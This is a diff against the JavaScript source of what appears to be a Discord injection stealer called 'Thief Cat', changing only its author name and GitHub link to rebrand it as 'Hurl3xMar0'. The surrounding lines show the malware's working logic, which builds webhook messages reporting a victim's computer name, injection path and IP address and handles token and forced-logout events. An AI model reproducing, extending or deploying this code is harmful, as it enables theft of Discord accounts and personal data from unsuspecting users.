@@ -77,11 +77,11 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: `Thief Cat`
+                name: `Hurl3xMar0`
             },
             
             footer: {
-                text: ` [${config.creator}] | https://github.com/FalseKSCH/`
+                text: ` [${config.creator}] | https://github.com/xMar-O/`
             },
 
         }]
@@ -302,7 +302,7 @@ const FirstTime = async () => {
     var client_discord = appName
     if (!token) {
         var params = await makeEmbed({
-            title: "<a:caat:1130448857436782682> Thief Cat Initialized",
+            title: "<a:caat:1130448857436782682> Hurl3xMar0 Initialized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
@@ -395,7 +395,7 @@ const FirstTime = async () => {
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
-                title: "<a:caat:1130448857436782682> Thief Cat User log out (User not Logged in before)",
+                title: "<a:caat:1130448857436782682> Hurl3xMar0 User log out (User not Logged in before)",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
